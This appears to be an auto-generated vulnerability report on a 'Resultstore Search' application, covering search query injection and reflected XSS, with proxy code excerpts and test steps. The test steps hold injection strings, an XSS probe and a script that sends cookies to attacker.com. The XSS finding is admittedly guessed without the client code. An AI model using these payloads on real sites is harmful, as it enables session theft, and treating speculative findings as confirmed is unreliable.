## Combined Vulnerability List

This document outlines the identified high and critical vulnerabilities, consolidated from the provided lists and formatted for clarity.

### 1. Search Query Injection in SearchInvocations

- **Vulnerability Name:** Search Query Injection in SearchInvocations

- **Description:**
  - A malicious user can inject arbitrary search queries through the ResultStore search bar.
  - User input from the search bar is directly passed to the `SearchInvocations` gRPC method in the backend proxy server.
  - The proxy server forwards this query to the ResultStore API without any sanitization or validation.
  - By crafting a malicious search query, an attacker could potentially bypass access controls or extract sensitive data from ResultStore if the backend ResultStore API is vulnerable to query injection and lacks sufficient input sanitization.

- **Impact:**
  - Unauthorized access to sensitive test result data stored in Google Cloud ResultStore.
  - Potential bypass of access control mechanisms, granting unauthorized users access to results they should not view.
  - Information disclosure of confidential test results or project metadata.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
  - None are implemented in the provided proxy server code.
  - There might be mitigations on the client-side or within the backend ResultStore API, but these are outside the scope of the provided information.

- **Missing Mitigations:**
  - Implement input sanitization and validation on the server-side proxy before forwarding search queries to the ResultStore API. This should include measures to neutralize or escape potentially malicious characters or commands within the query.
  - Implement proper output encoding when displaying search results in the UI to prevent injection vulnerabilities on the client-side.
  - Consider using parameterized queries or prepared statements when constructing dynamic queries for the backend ResultStore API to prevent injection attacks.

- **Preconditions:**
  - The attacker must have network access to the Resultstore Search application.
  - The application must be configured to forward search queries directly to the backend ResultStore API without sanitization in the proxy server.
  - The backend ResultStore API must be vulnerable to search query injection or lack sufficient input validation to prevent malicious queries from being executed.

- **Source Code Analysis:**
  - **File:** `/code/resultstoresearch/server/resultstoresearch/resultstore_proxy_server.py`
  - **Method:** `SearchInvocations`

  ```python
    def SearchInvocations(self, request, context):
        """
        Proxies the SearchInvocations gRPC call forward

        Args:
            request (SearchInvocationsRequest): The search request
            context (grpc.Context)

        Returns:
            SearchInvocationsResponse
        """
        _LOGGER.info('Received request: %s', request)
        new_request = resultstore_download_pb2.SearchInvocationsRequest(
            query=request.query, # User-controlled input 'request.query' is directly used here
            project_id=request.project_id,
            page_size=request.page_token,
        )
        return self._search_helper(new_request, request.tool, context)

    def _search_helper(self, request, tool, context):
        metadata = context.invocation_metadata()
        stub = resultstore_download_pb2_grpc.ResultStoreDownloadStub(
            self.channel)
        try:
            response = stub.SearchInvocations(request, metadata=metadata) # 'request' which contains user input 'request.query' is passed directly to backend API
        except grpc.RpcError as rpc_error:
            _LOGGER.error('Received error: %s', rpc_error)
            configure_grpc_error(context, rpc_error)
            return resultstoresearch_download_pb2.SearchInvocationsResponse()
        else:
            _LOGGER.info('Received message: %s', response)
            tools_list = self.fs.get_tools()
            tools_list = update_tools_list(response.invocations, tools_list,
                                           self.fs)
            filtered_invocations = filter_tool(response.invocations, tool)
            return resultstoresearch_download_pb2.SearchInvocationsResponse(
                invocations=filtered_invocations,
                next_page_token=response.next_page_token,
                tools_list=list(tools_list))
  ```

  - **Visualization:**

  ```
  User Input (Search Bar) --> SearchInvocations (proxy server) --> SearchInvocationsRequest (gRPC) --> ResultStore API
  ```

  - **Explanation:** The `SearchInvocations` method in `resultstore_proxy_server.py` directly takes the `query` parameter from the user request (`request.query`) and forwards it in a new `SearchInvocationsRequest` to the backend ResultStore API. There is no input sanitization or validation performed on the `request.query` within this proxy server code. This direct forwarding makes the application vulnerable to search query injection if the backend ResultStore API is also vulnerable and doesn't perform sufficient input validation.

- **Security Test Case:**
  - **Preconditions:** Deploy a publicly accessible instance of the Resultstore Search application.
  - **Steps:**
    1. Open a web browser and navigate to the deployed Resultstore Search application.
    2. In the search bar, enter a malicious search query designed to test for injection, such as: `name="test-invocation" OR 1=1 --`, `labels:"' or '1'='1"`, or other SQL/NoSQL injection payloads adapted for search queries syntax expected by ResultStore API.
    3. Submit the search query and observe the application's response.
    4. Analyze the search results. If the query injection is successful, the application might return unexpected results, bypass access controls, or reveal sensitive information that should not be accessible with a normal query.
  - **Expected Result:** If the vulnerability exists, the application will process the malicious query and potentially return unexpected results or errors, indicating a successful injection.
  - **Success Condition:** The test is successful if the application returns unexpected search results or errors due to the injected query, demonstrating a search query injection vulnerability.

### 2. Reflected Cross-Site Scripting (XSS) in Search Bar

- **Vulnerability Name:** Reflected Cross-Site Scripting (XSS) in Search Bar

- **Description:**
  1. An attacker crafts a malicious URL containing JavaScript code within the search query parameter.
  2. A user clicks on this malicious URL or visits a page where this URL is dynamically generated and embedded (e.g., through a link in an email or another website).
  3. The Resultstore Search application processes the URL, extracts the search query containing the malicious JavaScript code, and reflects it directly into the HTML of the search results page without proper sanitization or encoding.
  4. The user's browser executes the injected JavaScript code, as it is rendered as part of the page's HTML content.

- **Impact:**
  - Execution of malicious JavaScript code in the user's browser when they view search results.
  - Potential session hijacking, allowing the attacker to impersonate the user and gain unauthorized access to their account.
  - Data theft, including sensitive information like cookies, session tokens, and potentially any data displayed on the page.
  - Redirection of the user to malicious websites controlled by the attacker.
  - Defacement of the web page, altering its appearance and potentially damaging the application's reputation.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
  - None have been identified in the provided project files. Based on the available code, there is no evidence of input sanitization or output encoding mechanisms in place to prevent XSS vulnerabilities.

- **Missing Mitigations:**
  - **Input Sanitization:** Implement robust server-side sanitization to remove or neutralize any potentially malicious JavaScript code or HTML tags from user input before processing the search query.
  - **Output Encoding:** Implement context-aware output encoding on the client-side. Encode user-provided data before rendering it in HTML, especially within contexts where JavaScript execution is possible (e.g., when displaying search terms or results). Utilize appropriate encoding functions provided by the React framework or Javascript libraries to prevent XSS.
  - **Content Security Policy (CSP):** Implement a strict Content Security Policy (CSP) to restrict the sources from which the browser is allowed to load resources, significantly reducing the potential impact of XSS attacks, even if input sanitization or output encoding fails.

- **Preconditions:**
  - A user must click on a malicious link or visit a page containing the malicious URL crafted by the attacker.
  - The Resultstore Search application must be accessible to the attacker (either a publicly accessible instance or the attacker gains authorized access).

- **Source Code Analysis:**
  - The provided project files do not include the Javascript code for the client-side application, making a direct code analysis of the React components handling the search bar and rendering results impossible with the given information.
  - However, the application description strongly suggests that user input from the search bar is used to query and display results.
  - The vulnerability is likely located in the client-side Javascript code responsible for rendering search results, where user input from the search query might be reflected into the DOM without proper output encoding.
  - The server-side Python code in `/code/resultstoresearch/resultstoresearch/resultstore_proxy_server.py` handles search requests but does not appear to be directly involved in rendering the search results in the user's browser, making the client-side Javascript the primary area of concern for this XSS vulnerability.

- **Security Test Case:**
  1. Access the Resultstore Search application through a web browser.
  2. In the search bar, enter the following payload: `<img src=x onerror=alert('XSS')>`
  3. Click the "Search" button or press Enter to initiate the search.
  4. Observe if an alert box with the text "XSS" appears on the page. If an alert box appears, it indicates that the injected JavaScript code was executed, confirming the reflected XSS vulnerability.
  5. For a more impactful test, try a payload that attempts to steal session cookies and send them to an attacker-controlled server: `<script>window.location='http://attacker.com/cookie_stealer?cookie='+document.cookie;</script>`.  Then, check the logs of `attacker.com` to see if the cookie was successfully sent. You will need to control `attacker.com` to observe the results.

These vulnerabilities represent significant security risks and should be addressed with high priority. Implementing the suggested mitigations is crucial to protect user data and prevent potential attacks.
